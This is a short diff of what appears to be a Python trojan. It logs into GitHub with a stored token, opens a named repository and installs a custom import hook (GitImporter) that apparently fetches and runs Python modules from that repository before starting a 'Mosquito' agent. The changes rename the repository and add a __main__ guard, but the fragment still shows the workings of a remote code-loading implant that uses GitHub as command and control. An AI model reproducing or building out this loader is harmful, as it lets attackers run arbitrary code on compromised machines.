@@ -14,7 +14,7 @@ def github_connect():
         token = f.read()
     user = 'Mike-The-Konops-Lord'
     sess = github3.login(token=token)
-    return sess.repository(user, 'KonopsTest')
+    return sess.repository(user, 'KonopzTest')
 
 def get_file_contents(dirname, module_name, repo):
     return repo.file_contents(f'{dirname}/{module_name}').content
@@ -78,6 +78,7 @@ class GitImporter:
         return new_module
 
 
-sys.meta_path.append(GitImporter())
-mosquito = Mosquito('msid_0')
-mosquito.run()
+if __name__ == '__main__':
+    sys.meta_path.append(GitImporter())
+    mosquito = Mosquito('msid_0')
+    mosquito.run()
